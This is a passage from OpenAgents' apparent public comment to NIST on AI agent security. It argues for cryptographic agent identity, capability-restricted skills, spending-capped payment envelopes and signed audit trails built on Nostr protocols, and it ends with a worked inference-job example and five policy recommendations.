+- Can cryptographic signatures satisfy "non-repudiation" requirements (UCC Article 2B, ESIGN Act)?
+
+**Benefit:** Legal clarity enables risk management, insurance products, and dispute resolution mechanisms.
+
+### 5.2 What research should be prioritized?
+
+**Research Priority 1: Formal verification of capability enforcement**
+
+**Goal:** Prove that runtime CANNOT grant undeclared capabilities, even in adversarial scenarios.
+
+**Approach:**
+- Model runtime as state machine with capability flags.
+- Prove that for all states and inputs, attempted tool call with undeclared capability results in denial.
+- Extend to cover timing attacks, race conditions, exception handling.
+
+**Outcome:** High-assurance agent runtimes for critical infrastructure.
+
+**Research Priority 2: Economic incentives for skill security**
+
+**Goal:** Make it economically rational for skill authors to invest in security and for users to prefer secure skills.
+
+**Approach:**
+- Performance bonds: Skill authors post Cashu bond (e.g., 100k sats); if skill causes harm, bond is slashed and distributed to victims.
+- Insurance markets: Underwriters offer policies covering agent mishaps; premium based on skill trust tier.
+- Reputation-weighted discounts: High-trust skills get lower compute pricing, faster approval, better visibility.
+
+**Outcome:** Self-regulating ecosystem where bad actors are priced out.
+
+**Research Priority 3: Multi-party agent coordination protocols**
+
+**Goal:** Enable agents from different operators to coordinate on shared tasks without trusting each other.
+
+**Approach:**
+- Use cryptographic protocols (zero-knowledge proofs, secure multi-party computation) for joint computation without revealing secrets.
+- Use escrow and performance bonds for financial alignment.
+- Use trajectory logs for accountability and dispute resolution.
+
+**Outcome:** Agent marketplaces, agent DAOs, agent supply chains with verifiable security properties.
+
+### 5.3 What gaps exist in current cybersecurity approaches when applied to AI agents?
+
+**Gap 1: Centralized identity registries do not fit open agent ecosystems**
+
+**Enterprise IAM** (OIDC/OAuth, SCIM, LDAP, Active Directory) works for employees and services inside one administrative domain, but agents transact across domains: marketplaces, compute providers, payment gateways, relays.
+
+**If compliance assumes centralized registries:**
+- Open-source agents excluded (cannot enroll in enterprise directory).
+- Small developers excluded (cannot afford enterprise IAM suite).
+- Cross-domain transactions broken (agent cannot authenticate to provider in different domain).
+
+**NIST must explicitly recognize open, cryptographic, decentralized identity + authorization mechanisms as valid compliance paths**, including:
+- Keypair-based principals (npub/nsec, no enrollment).
+- Signed manifests and audit logs (self-attested, third-party attested).
+- Web-of-trust attestations (NIP-32 labels, zap-weighted reputation).
+
+**Gap 2: "Prompt injection defenses" cannot replace hard authorization boundaries**
+
+**Content filtering, jailbreak detection, and "agent firewalls"** can reduce injection success rates but cannot provide security guarantees. The durable mitigation is: **even if the model is tricked, the runtime cannot exceed authorized capabilities.**
+
+**NIST guidance should prioritize system-level enforcement** (capability contracts, runtime sandboxing, audit trails) over model-level alignment (trying to make models "want" to be secure).
+
+**Gap 3: Payment authorization treated as afterthought**
+
+**Most frameworks focus on data and credentials** but ignore payment authorization. Yet agent payments (to compute, APIs, skills, other agents) are a dominant real-world action with direct financial impact.
+
+**NIST should treat payment authorization as first-class concern:**
+- Define scope-cap-expiry envelopes as best practice.
+- Require auditable settlement receipts (cryptographic proof of payment → outcome).
+- Mandate spending anomaly detection (alert on rapid spend, out-of-scope attempts).
+
+---
+
+## Concrete Use Case: Paid Inference Job with Skill Execution
+
+**Scenario:** A sovereign agent wants to run a paid NIP-90 inference job using a skill that processes Bitcoin payment data.
+
+**Step-by-step security controls:**
+
+1. **Agent Identity (NIP-SA):**
+   - Agent has persistent Nostr identity (npub: `npub1agent...`).
+   - Agent publishes profile (`kind:39200`) listing capabilities, operator, Lightning address.
+   - Agent publishes state (`kind:39201`, NIP-44 encrypted) with goals, memory, wallet balance.
+
+2. **Skill Discovery (NIP-SKL):**
+   - Agent queries marketplace for "bitcoin payment processor" skills.
+   - Marketplace returns listings (`kind:30402`) pointing to skill manifests.
+   - Agent fetches skill manifest (`kind:33400` for `bitcoin-payment-processor:2.1.0`).
+
+3. **Skill Verification (NIP-SKL):**
+   - Agent verifies manifest signature (signed by skill npub `npub1skill...`).
+   - Agent checks delegation chain: `npub1skill...` → `npub1agent...` → `npub1author...` (NIP-26).
+   - Agent checks expiry: manifest expires in 60 days (within policy).
+   - Agent checks declared capabilities:
+     - `payment:lightning:send`
+     - `payment:cashu:melt`
+     - `http:outbound`
+     - `filesystem:read`
+
+4. **Trust Tier Check (NIP-SKL):**
+   - Agent queries for `kind:1985` attestations on skill manifest.
+   - Finds 3 positive labels from trusted labelers (total 500k sats zapped).
+   - No negative labels found.
+   - Calculates trust tier: `full` (meets threshold for payment capabilities).
+   - Policy check: skill declares `payment:lightning:send` (requires `full` tier) → PASS.
+
+5. **Skill Delivery (NIP-SA + NIP-SKL):**
+   - Agent sends payment (or credit envelope) to skill provider.
+   - Provider delivers skill via `kind:39221` (NIP-44 encrypted, gift-wrapped).
+   - Agent decrypts using threshold ECDH (agent share + marketplace share).
+   - Marketplace signer checks: Is agent licensed for this skill? Yes, license valid.
+   - Marketplace participates in ECDH, agent decrypts skill.
+   - Agent computes SHA-256 of decrypted SKILL.md payload.
+   - Agent verifies hash matches `manifest_hash` in manifest → PASS.
+
+6. **Envelope Acquisition (NIP-AC):**
+   - Agent wants to run NIP-90 job (text generation for payment analysis).
+   - Agent creates envelope request: scope=`nip90:<job_hash>`, max=5000 sats, duration=1 hour.
+   - Agent sends request to credit issuer.
+   - Issuer checks agent reputation (past settlements, negative labels, wallet balance).
+   - Issuer approves: creates envelope (`kind:39242`) and sends to agent.
+
+7. **Job Execution (NIP-90 + NIP-SA):**
+   - Agent constructs NIP-90 job request (`kind:5050`) with prompt and parameters.
+   - Agent signs job request with agent key (threshold signature: agent share + marketplace share).
+   - Marketplace signer checks: Is this within budget? Is skill authorized? → PASS.
+   - Agent publishes job request to relay.
+   - Compute provider picks up job, verifies envelope validity.
+   - Provider runs inference, returns result (`kind:6050`).
+
+8. **Payment Settlement (NIP-AC):**
+   - Provider sends invoice (3000 sats) to issuer with envelope reference.
+   - Issuer verifies: envelope scope matches job ID, spend within cap (3000 < 5000), not expired → PASS.
+   - Issuer pays provider via Lightning.
+   - Issuer publishes settlement receipt (`kind:39244`):
+     ```json
+     {
+       "tags": [
+         ["credit", "<envelope_id>"],
+         ["scope", "nip90", "<job_hash>"],
+         ["spent", "3000"],
+         ["job", "6050", "<job_result_id>"],
+         ["proof", "<payment_preimage>"]
+       ]
+     }
+     ```
+
+9. **Trajectory Logging (NIP-SA):**
+   - Agent publishes trajectory events (`kind:39231`) throughout execution:
+     - Session start (goal: analyze payment data)
+     - Skill loaded (bitcoin-payment-processor:2.1.0)
+     - Tool call: query payment API
+     - Tool result: received data
+     - Job submitted (NIP-90 job ID)
+     - Job result received
+     - Session end (summary: analysis complete, 3000 sats spent)
+
+10. **Post-Execution Audit:**
+    - Operator reviews trajectory logs: all actions within scope.
+    - Operator verifies settlement receipt: spend matches expected cost.
+    - Operator checks skill behavior: no undeclared capabilities invoked.
+    - All green → Agent reputation maintained, ready for next task.
+
+**Security properties achieved:**
+
+✅ **Identity:** Agent has persistent, verifiable identity across entire flow.  
+✅ **Capability Enforcement:** Skill could only invoke declared capabilities; runtime denied undeclared attempts.  
+✅ **Trust Gating:** Skill loaded only after trust tier check passed.  
+✅ **Tamper Detection:** Hash verification ensured delivered skill matched manifest.  
+✅ **Scope-Bounded Authorization:** Envelope limited spending to this specific job.  
+✅ **Threshold Keys:** Agent key extraction impossible; marketplace enforced license + policy.  
+✅ **Auditable Trail:** Full trajectory + settlement receipt provide forensic evidence.  
+✅ **Automated Enforcement:** If skill later gets negative label, future envelopes auto-revoked.
+
+**This is a complete, cryptographically secured, auditable workflow** using open protocols—no centralized identity registry, no vendor lock-in, no human-in-loop for routine actions.
+
+---
+
+## Conclusion and Specific NIST Recommendations
+
+Based on OpenAgents' experience building sovereign agent systems with Bitcoin-native payments and open protocol infrastructure, we recommend NIST:
+
+### Recommendation 1: Define AI agents as software principals requiring identity + authorization controls distinct from user sessions
+
+**Rationale:** Agents are long-lived, act autonomously, handle sensitive data and payments, and transact across trust boundaries. They need persistent identity and authorization mechanisms, not ephemeral session tokens.
+
+**Concrete action:** Publish guidance stating: "AI agent systems SHOULD implement persistent cryptographic identity (keypairs), capability-based authorization (manifests), and tamper-evident audit trails (signed event logs)."
+
+### Recommendation 2: Require hard authorization boundaries at tool and payment rails
+
+**Rationale:** Model-level alignment cannot provide security guarantees. System-level enforcement is essential.
+
+**Concrete action:** Publish guidance stating: "Agent runtimes MUST enforce capability restrictions at execution time. Attempted tool calls exceeding declared capabilities MUST be denied and logged. Payment authorization MUST be scoped, capped, and time-limited."
+
+### Recommendation 3: Explicitly recognize open protocol alternatives for identity, delegation, and capabilities
+
+**Rationale:** Compliance frameworks that assume centralized IAM exclude open-source agents and small developers, concentrating control in large vendors.
+
+**Concrete action:** Publish guidance stating: "Compliance with this guidance MAY be achieved using centralized identity providers (OAuth, SAML, enterprise directory) OR using decentralized cryptographic identity (keypairs, signed manifests, event-based audit trails). Both approaches are valid if they meet the functional requirements."
+
+### Recommendation 4: Promote scope-cap-expiry authorization envelopes as best practice for autonomous actions
+
+**Rationale:** Unrestricted agent wallets or API keys create catastrophic downside. Bounded envelopes limit blast radius.
+
+**Concrete action:** Publish guidance stating: "Agent systems that initiate financial transactions or high-risk actions SHOULD use outcome-scoped authorization envelopes with hard caps, expiry timestamps, and auditable settlement receipts."
+
+### Recommendation 5: Standardize safety signaling + revocation loops
+
+**Rationale:** Security at agent ecosystem scale requires automated enforcement, not manual vendor decisions.
+
+**Concrete action:** Publish guidance stating: "Agent ecosystems SHOULD implement automated revocation triggers: when a trusted labeler publishes a negative safety label, runtimes SHOULD deny skill loads and issuers SHOULD revoke active envelopes scoped to that skill. Manual review MAY override, but default SHOULD be automated denial."
+
+---
+
+## Closing Statement
+
+AI agents represent a fundamental shift in how software systems operate: from reactive (responding to user commands) to proactive (pursuing goals autonomously). This shift requires rethinking identity, authorization, and accountability.
+
+OpenAgents urges NIST to preserve space for **open, permissionless innovation** by explicitly recognizing decentralized, cryptographic approaches to agent security. Centralized identity registries and enterprise IAM have their place, but they cannot be the only valid path to compliance in an ecosystem that will include open-source agents, small developers, and cross-domain transactions.
+
+The proposals in this response (NIP-SA, NIP-SKL, NIP-AC) are not hypothetical—they are actively being implemented and deployed. OpenAgents is available to provide:
+- Reference implementations (code, test vectors, deployment guides)
+- Security audits and red team exercises
+- Participation in NIST working groups or standards committees
+- Case studies and operational data from production deployments
+
+We respectfully request that NIST consider these open protocol approaches alongside traditional enterprise security patterns in its forthcoming guidance.
+
+---
+
+**Contact Information:**
+
+OpenAgents  
+Email: [to be provided]  
+GitHub: https://github.com/OpenAgentsInc  
+Nostr: [npub to be provided]
+
+**Attachments:**
+1. NIP-AC: Agent Credit (full specification)
+2. NIP-SKL: Agent Skill Identity, Manifest, and Trust Registry (full specification)
+3. Technical Appendix (event schemas, workflow diagrams, code examples)
+
+---
+
+**End of Response**
+
+*Submitted to www.regulations.gov, Docket NIST-2025-0035, March 4, 2026*
